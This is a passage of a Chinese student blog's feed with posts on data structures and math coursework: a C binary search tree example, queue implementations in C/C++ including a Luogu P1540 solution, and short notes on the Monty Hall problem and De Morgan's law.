class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span>  </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span>  </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span>  </span><br><br><span class="hljs-comment">// 定义二叉树节点结构体  </span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">TreeNode</span> &#123;</span>  <br><span class="hljs-type">char</span> *s;  <br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">TreeNode</span> *<span class="hljs-title">Left</span>;</span>  <br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">TreeNode</span> *<span class="hljs-title">Right</span>;</span>  <br>&#125; BinTree;  <br><br><span class="hljs-comment">// 插入函数  </span><br>BinTree* <span class="hljs-title function_">TreeInsert</span><span class="hljs-params">(<span class="hljs-type">char</span> *s, BinTree *T)</span> &#123;  <br><span class="hljs-keyword">if</span> (T == <span class="hljs-literal">NULL</span>) &#123;  <br>T = (BinTree*)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(BinTree));  <br><span class="hljs-keyword">if</span> (T == <span class="hljs-literal">NULL</span>) &#123;  <br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Memory allocation failed\n&quot;</span>);  <br><span class="hljs-built_in">exit</span>(EXIT_FAILURE);  <br>&#125;  <br>T-&gt;s = strdup(s);  <span class="hljs-comment">// 复制字符串  </span><br>T-&gt;Left = T-&gt;Right = <span class="hljs-literal">NULL</span>;  <br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strcmp</span>(s, T-&gt;s) &lt; <span class="hljs-number">0</span>) &#123;  <br>T-&gt;Left = TreeInsert(s, T-&gt;Left);  <br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strcmp</span>(s, T-&gt;s) &gt; <span class="hljs-number">0</span>) &#123;  <br>T-&gt;Right = TreeInsert(s, T-&gt;Right);  <br>&#125;  <br><span class="hljs-comment">// 不处理重复项（如果s等于T-&gt;s，则不插入）  </span><br><span class="hljs-keyword">return</span> T;  <br>&#125;  <br><br><span class="hljs-comment">// 中序遍历函数  </span><br><span class="hljs-type">void</span> <span class="hljs-title function_">InOrderTraversal</span><span class="hljs-params">(BinTree *T)</span> &#123;  <br><span class="hljs-keyword">if</span> (T != <span class="hljs-literal">NULL</span>) &#123;  <br>InOrderTraversal(T-&gt;Left);  <br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s\n&quot;</span>, T-&gt;s);  <br>InOrderTraversal(T-&gt;Right);  <br>&#125;  <br>&#125;  <br><br><span class="hljs-comment">// 释放二叉树内存的函数  </span><br><span class="hljs-type">void</span> <span class="hljs-title function_">FreeTree</span><span class="hljs-params">(BinTree *T)</span> &#123;  <br><span class="hljs-keyword">if</span> (T != <span class="hljs-literal">NULL</span>) &#123;  <br>FreeTree(T-&gt;Left);  <br>FreeTree(T-&gt;Right);  <br><span class="hljs-built_in">free</span>(T-&gt;s);  <span class="hljs-comment">// 释放字符串内存  </span><br><span class="hljs-built_in">free</span>(T);     <span class="hljs-comment">// 释放节点内存  </span><br>&#125;  <br>&#125;  <br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;  <br><span class="hljs-type">char</span>* months[<span class="hljs-number">12</span>] = &#123;  <br><span class="hljs-string">&quot;January&quot;</span>, <span class="hljs-string">&quot;February&quot;</span>, <span class="hljs-string">&quot;March&quot;</span>, <span class="hljs-string">&quot;April&quot;</span>,    <br><span class="hljs-string">&quot;May&quot;</span>, <span class="hljs-string">&quot;June&quot;</span>, <span class="hljs-string">&quot;July&quot;</span>, <span class="hljs-string">&quot;August&quot;</span>,    <br><span class="hljs-string">&quot;September&quot;</span>, <span class="hljs-string">&quot;October&quot;</span>, <span class="hljs-string">&quot;November&quot;</span>, <span class="hljs-string">&quot;December&quot;</span>    <br>&#125;;  <br>BinTree *T = <span class="hljs-literal">NULL</span>;  <br><br><span class="hljs-comment">// 插入月份到BST  </span><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">12</span>; i++) &#123;  <br>T = TreeInsert(months[i], T);  <br>&#125;  <br><br><span class="hljs-comment">// 中序遍历BST并打印结果  </span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Inorder traversal of BST:\n&quot;</span>);  <br>InOrderTraversal(T);  <br><br><span class="hljs-comment">// 释放二叉树内存  </span><br>FreeTree(T);  <br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;  <br>&#125;<br></code></pre></td></tr></table></figure><p><strong>可以试试把递归和非递归的各种遍历都试试。</strong></p>        </div>      </div>    </div>]]></content>
    
    
    <categories>
      
      <category>Theory</category>
      
      <category>数据结构与算法</category>
      
    </categories>
    
    
    <tags>
      
      <tag>树</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>概率统计0</title>
    <link href="/dong.github/2024/09/10/statistics0/"/>
    <url>/dong.github/2024/09/10/statistics0/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\dong.github\assets\css\APlayer.min.css"><script src="\dong.github\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><strong>“必须明确“等可能性”是相对实验点而言的。”</strong></p><span id="more"></span><p><strong>本文企图通过山羊与汽车问题、贝特朗悖论等例子，说明“必须明确“等可能性”是相对实验点而言的。”，进而阐明一般概率和条件概率的关系，作为第一章到第二章的衔接过渡。</strong></p><h1 id="山羊与汽车问题"><a href="#山羊与汽车问题" class="headerlink" title="山羊与汽车问题"></a>山羊与汽车问题</h1><p><strong>第一节课一上课就提出了这个问题，怎么解？</strong><br><img src="/dong.github/images/0910-3.png"><br>补充一下：主持人是在知道每扇门背后有什么的情况下打开的。</p>    <div class="fold">      <div class="fold-title fold-info collapsed" data-toggle="collapse" href="#collapse-6105cd3c" role="button" aria-expanded="false" aria-controls="collapse-6105cd3c">        <div class="fold-arrow">▶</div>嗯？思考一下？      </div>      <div class="fold-collapse collapse" id="collapse-6105cd3c">        <div class="fold-content">          <p><img src="/dong.github/images/0910-4.png"></p>        </div>      </div>    </div>]]></content>
    
    
    <categories>
      
      <category>Theory</category>
      
      <category>数学基础</category>
      
    </categories>
    
    
    <tags>
      
      <tag>概率统计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>数理逻辑-集合与逻辑-逻辑代数</title>
    <link href="/dong.github/2024/09/10/math0/"/>
    <url>/dong.github/2024/09/10/math0/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\dong.github\assets\css\APlayer.min.css"><script src="\dong.github\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><strong>几乎是同时地，概率统计、数字电路基础、离散数学三门核心课同时涉及到了非常类似的内容。所以这篇blog作为总序，希望可以阐明这其中的区别与联系，为三门课程的后续打下个好基础。另外就是在这里集中整理一下De Morgan律的证明与应用（因为到处在用）。</strong></p><span id="more"></span><p><strong>开宗明义：为什么有那么多这么相似的符号，什么时候成了逻辑语句，什么时候又成了集合？</strong><br><img src="/dong.github/images/0910.png"><br><strong>简言之，数电和离散数学（第一二章）在用逻辑解决问题，而概统和离散数学（第三章）在用集合解决问题。而集合与逻辑的关系如上图。</strong><br><strong>“一阶逻辑的语法、语义概念都可以在集合论中定义， 关于一阶逻辑的定理可以被看作是集合论的定理”。</strong></p><h1 id="概率统计："><a href="#概率统计：" class="headerlink" title="概率统计："></a>概率统计：</h1><p><strong>事件为集合，事件间的关系和运算按照集合间的关系和运算来处理。由“事件发生”的含义，当赋予集合间的关系和运算以概率含义时，就得到事件间的关系和运算.</strong></p><h1 id="电子技术基础（数字部分）："><a href="#电子技术基础（数字部分）：" class="headerlink" title="电子技术基础（数字部分）："></a>电子技术基础（数字部分）：</h1><p><strong>逻辑代数有一定的定理、定理和规则，用它们对数学表达式进行处理，可以完成对逻辑电路的化简、变换、分析和设计。</strong><br><strong>利用逻辑代数这种数学工具，可以把逻辑电路输入和输出之间的关系用代数方程表示出来。</strong></p><h1 id="离散数学："><a href="#离散数学：" class="headerlink" title="离散数学："></a>离散数学：</h1><p><strong>命题逻辑：命题是逻辑学研究的出发点。</strong><br><strong>一阶谓词逻辑：命题逻辑的不足，在于它不能有效区分主体客体。</strong><br><strong>集合与关系：集合是数学中最为基本的概念，又是数学各分支等各领域最普遍的描述工具。</strong></p><h1 id="De-Morgan定律"><a href="#De-Morgan定律" class="headerlink" title="De Morgan定律"></a>De Morgan定律</h1><p><strong>同一个东西，离散数学里叫De Morgan律，数电中叫反演规则，概统叫对偶律。应用很多，可以说是三门共同的考点。</strong><br><img src="/dong.github/images/0910-1.png"><br><img src="/dong.github/images/0910-2.png"><br><strong>直接用数学语言证明不太容易，以上两种办法即可。但是更重要的还是其应用。</strong></p>]]></content>
    
    
    <categories>
      
      <category>Theory</category>
      
      <category>数学基础</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Datastructures-队列</title>
    <link href="/dong.github/2024/09/08/Datastructures-%E9%98%9F%E5%88%97/"/>
    <url>/dong.github/2024/09/08/Datastructures-%E9%98%9F%E5%88%97/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\dong.github\assets\css\APlayer.min.css"><script src="\dong.github\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><strong>先进先出的数据结构，很常用</strong></p><span id="more"></span>    <div class="fold">      <div class="fold-title fold-info collapsed" data-toggle="collapse" href="#collapse-8f7bdefe" role="button" aria-expanded="false" aria-controls="collapse-8f7bdefe">        <div class="fold-arrow">▶</div>STL queue      </div>      <div class="fold-collapse collapse" id="collapse-8f7bdefe">        <div class="fold-content">          <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;queue&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>queue&lt;<span class="hljs-type">int</span>&gt; Q;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;入队5\n&quot;</span>); <br>Q.<span class="hljs-built_in">push</span>(<span class="hljs-number">5</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;入队4\n&quot;</span>); <br>Q.<span class="hljs-built_in">push</span>(<span class="hljs-number">4</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;入队3\n&quot;</span>); <br>Q.<span class="hljs-built_in">push</span>(<span class="hljs-number">3</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;出队%d\n&quot;</span>,Q.<span class="hljs-built_in">front</span>());<br>Q.<span class="hljs-built_in">pop</span>();<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;出队%d\n&quot;</span>,Q.<span class="hljs-built_in">front</span>());<br>Q.<span class="hljs-built_in">pop</span>();<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;出队%d\n&quot;</span>,Q.<span class="hljs-built_in">front</span>());<br>Q.<span class="hljs-built_in">pop</span>();<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125; <br></code></pre></td></tr></table></figure>        </div>      </div>    </div><div class="group-image-container"><div class="group-image-row"><div class="group-image-wrap"><img src="/dong.github/images/0908-2.png"></div><div class="group-image-wrap"><img src="/dong.github/images/0908-3.png"></div></div></div><p><strong>举个栗子：</strong></p>    <div class="fold">      <div class="fold-title fold-info collapsed" data-toggle="collapse" href="#collapse-e3c90cfe" role="button" aria-expanded="false" aria-controls="collapse-e3c90cfe">        <div class="fold-arrow">▶</div>洛谷P1540      </div>      <div class="fold-collapse collapse" id="collapse-e3c90cfe">        <div class="fold-content">          <p><a href="https://www.luogu.com.cn/problem/P1540">https://www.luogu.com.cn/problem/P1540</a></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-type">int</span> m,n;<br><span class="hljs-type">int</span> countt = <span class="hljs-number">0</span>;<br><span class="hljs-type">int</span> que[<span class="hljs-number">10000</span>];<br><span class="hljs-type">int</span> head;<br><span class="hljs-type">int</span> tail;<br>map&lt;<span class="hljs-type">int</span>,<span class="hljs-type">int</span>&gt;mapp;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>cin &gt;&gt; m &gt;&gt; n;<br>head = tail = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>;i &lt;= n;++ i)<br>&#123;<br><span class="hljs-type">int</span> c;cin &gt;&gt; c ;<br><span class="hljs-keyword">if</span>(mapp.<span class="hljs-built_in">count</span>(c))<br>&#123;<br><span class="hljs-keyword">continue</span>;<br>&#125;<br><span class="hljs-keyword">if</span>(tail - head + <span class="hljs-number">1</span> &lt;= m)<br>&#123;<br>countt ++ ;<br>que[tail] = c;<br>tail ++ ;<br>mapp[c] = <span class="hljs-number">1</span>;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>countt ++ ;<br>que[tail] = c;<br>tail ++ ;<br>mapp[c] = <span class="hljs-number">1</span>;<br>mapp.<span class="hljs-built_in">erase</span>(que[head]);<br>head ++ ;<br>&#125;<br>&#125;<br>cout &lt;&lt; countt &lt;&lt; endl;<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-comment">//数组模拟队列+map实现哈希表</span><br></code></pre></td></tr></table></figure>        </div>      </div>    </div>    <div class="fold">      <div class="fold-title fold-info collapsed" data-toggle="collapse" href="#collapse-6ae3e036" role="button" aria-expanded="false" aria-controls="collapse-6ae3e036">        <div class="fold-arrow">▶</div>循环队列的顺序存储实现      </div>      <div class="fold-collapse collapse" id="collapse-6ae3e036">        <div class="fold-content">          <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;malloc.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MaxSize 100</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">int</span> ElementType;<br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">QNode</span> *Queue;<br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">QNode</span>&#123;<br>ElementType Data[MaxSize];<br><span class="hljs-type">int</span> front;   <span class="hljs-comment">// 记录队头 </span><br><span class="hljs-type">int</span> rear;    <span class="hljs-comment">// 记录队尾 </span><br>&#125;;<br><br><span class="hljs-function">Queue <span class="hljs-title">CreateQueue</span><span class="hljs-params">()</span></span>;  <span class="hljs-comment">// 初始化队列 </span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">AddQ</span><span class="hljs-params">(Queue Q,ElementType item)</span></span>;  <span class="hljs-comment">//  入队</span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">IsFull</span><span class="hljs-params">(Queue Q)</span></span>; <span class="hljs-comment">// 判断队列是否已满 </span><br><span class="hljs-function">ElementType <span class="hljs-title">DeleteQ</span><span class="hljs-params">(Queue Q)</span></span>;  <span class="hljs-comment">// 出队 </span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">IsEmpty</span><span class="hljs-params">(Queue Q)</span></span>; <span class="hljs-comment">// 判断队列是否为空 </span><br><br><span class="hljs-comment">// 初始化 </span><br><span class="hljs-function">Queue <span class="hljs-title">CreateQueue</span><span class="hljs-params">()</span></span>&#123;<br>Queue Q;<br>Q = (Queue)<span class="hljs-built_in">malloc</span>(<span class="hljs-built_in">sizeof</span>(<span class="hljs-keyword">struct</span> QNode));<br>Q-&gt;front = <span class="hljs-number">-1</span>;<br>Q-&gt;rear = <span class="hljs-number">-1</span>;<br><span class="hljs-keyword">return</span> Q;<br>&#125; <br><br><span class="hljs-comment">// 判断队列是否已满</span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">IsFull</span><span class="hljs-params">(Queue Q)</span></span>&#123;<br> <span class="hljs-keyword">return</span> ((Q-&gt;rear<span class="hljs-number">+1</span>) % MaxSize == Q-&gt;front);<br>&#125;<br><br><span class="hljs-comment">// 入队 </span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">AddQ</span><span class="hljs-params">(Queue Q,ElementType item)</span></span>&#123;<br><span class="hljs-keyword">if</span>(<span class="hljs-built_in">IsFull</span>(Q))&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;队列满&quot;</span>);<br><span class="hljs-keyword">return</span>;<br>&#125;<span class="hljs-keyword">else</span>&#123; <br>Q-&gt;rear = (Q-&gt;rear<span class="hljs-number">+1</span>) % MaxSize;<br>Q-&gt;Data[Q-&gt;rear] = item; <br>&#125;<br>&#125;<br><br><span class="hljs-comment">//判断队列是否为空</span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">IsEmpty</span><span class="hljs-params">(Queue Q)</span></span>&#123;<br><span class="hljs-keyword">return</span> (Q-&gt;front == Q-&gt;rear);<br>&#125;<br> <br><span class="hljs-comment">// 出队</span><br><span class="hljs-function">ElementType <span class="hljs-title">DeleteQ</span><span class="hljs-params">(Queue Q)</span></span>&#123;<br><span class="hljs-keyword">if</span>(<span class="hljs-built_in">IsEmpty</span>(Q))&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;队列空&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>Q-&gt;front = (Q-&gt;front<span class="hljs-number">+1</span>) % MaxSize;<br><span class="hljs-keyword">return</span> Q-&gt;Data[Q-&gt;front];<br>&#125;<br>&#125; <br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>Queue Q;<br>Q = <span class="hljs-built_in">CreateQueue</span>();<br><span class="hljs-built_in">AddQ</span>(Q,<span class="hljs-number">3</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;3入队\n&quot;</span>);<br><span class="hljs-built_in">AddQ</span>(Q,<span class="hljs-number">5</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;5入队\n&quot;</span>);<br><span class="hljs-built_in">AddQ</span>(Q,<span class="hljs-number">11</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;11入队\n&quot;</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d出队\n&quot;</span>,<span class="hljs-built_in">DeleteQ</span>(Q));<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d出队\n&quot;</span>,<span class="hljs-built_in">DeleteQ</span>(Q));<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125; <br><br></code></pre></td></tr></table></figure>        </div>      </div>    </div>    <div class="fold">      <div class="fold-title fold-info collapsed" data-toggle="collapse" href="#collapse-9c51fa20" role="button" aria-expanded="false" aria-controls="collapse-9c51fa20">        <div class="fold-arrow">▶</div>队列的链式存储实现      </div>      <div class="fold-collapse collapse" id="collapse-9c51fa20">        <div class="fold-content">          <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;malloc.h&gt;</span></span><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">int</span> ElementType;<br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">QNode</span> *Queue;<br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">Node</span>&#123;<br>ElementType Data;<br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">Node</span> *Next;<br>&#125;;<br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">QNode</span>&#123;<br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">Node</span> *rear;    <span class="hljs-comment">// 指向队尾结点 </span><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">Node</span> *front;   <span class="hljs-comment">// 指向队头结点 </span><br>&#125;;<br><br><span class="hljs-function">Queue <span class="hljs-title">CreateQueue</span><span class="hljs-params">()</span></span>;  <span class="hljs-comment">// 初始化队列 </span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">AddQ</span><span class="hljs-params">(Queue Q,ElementType item)</span></span>;  <span class="hljs-comment">//  入队</span><br><span class="hljs-function">ElementType <span class="hljs-title">DeleteQ</span><span class="hljs-params">(Queue Q)</span></span>;  <span class="hljs-comment">// 出队 </span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">IsEmpty</span><span class="hljs-params">(Queue Q)</span></span>; <span class="hljs-comment">// 判断队列是否为空 </span><br><br><span class="hljs-comment">// 初始化 </span><br><span class="hljs-function">Queue <span class="hljs-title">CreateQueue</span><span class="hljs-params">()</span></span>&#123;<br>Queue Q;<br>Q = (Queue)<span class="hljs-built_in">malloc</span>(<span class="hljs-built_in">sizeof</span>(<span class="hljs-keyword">struct</span> QNode));<br>Q-&gt;front = <span class="hljs-literal">NULL</span>;<br>Q-&gt;rear = <span class="hljs-literal">NULL</span>;<br><span class="hljs-keyword">return</span> Q;<br>&#125;<br><br><span class="hljs-comment">// 是否为空 </span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">IsEmpty</span><span class="hljs-params">(Queue Q)</span></span>&#123;<br><span class="hljs-keyword">return</span> (Q-&gt;front == <span class="hljs-literal">NULL</span>);<br>&#125;<br><br><span class="hljs-comment">// 入队</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">AddQ</span><span class="hljs-params">(Queue Q,ElementType item)</span></span>&#123;<br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">Node</span> *node;<br>node = (<span class="hljs-keyword">struct</span> Node *)<span class="hljs-built_in">malloc</span>(<span class="hljs-built_in">sizeof</span>(<span class="hljs-keyword">struct</span> Node));<br>node-&gt;Data = item;<br>node-&gt;Next = <span class="hljs-literal">NULL</span>;<br><span class="hljs-keyword">if</span>(Q-&gt;rear==<span class="hljs-literal">NULL</span>)&#123;  <span class="hljs-comment">//此时队列空 </span><br>Q-&gt;rear = node;<br>Q-&gt;front = node;<br>&#125;<span class="hljs-keyword">else</span>&#123; <span class="hljs-comment">//不为空 </span><br>Q-&gt;rear-&gt;Next = node;  <span class="hljs-comment">// 将结点入队 </span><br>Q-&gt;rear = node;   <span class="hljs-comment">// rear 仍然保持最后 </span><br>&#125;<br>&#125; <br><br><span class="hljs-comment">// 出队</span><br><span class="hljs-function">ElementType <span class="hljs-title">DeleteQ</span><span class="hljs-params">(Queue Q)</span></span>&#123;<br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">Node</span> *FrontCell;<br>ElementType FrontElem;<br><span class="hljs-keyword">if</span>(<span class="hljs-built_in">IsEmpty</span>(Q))&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;队列空&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br>FrontCell = Q-&gt;front;<br><span class="hljs-keyword">if</span>(Q-&gt;front == Q-&gt;rear)&#123; <span 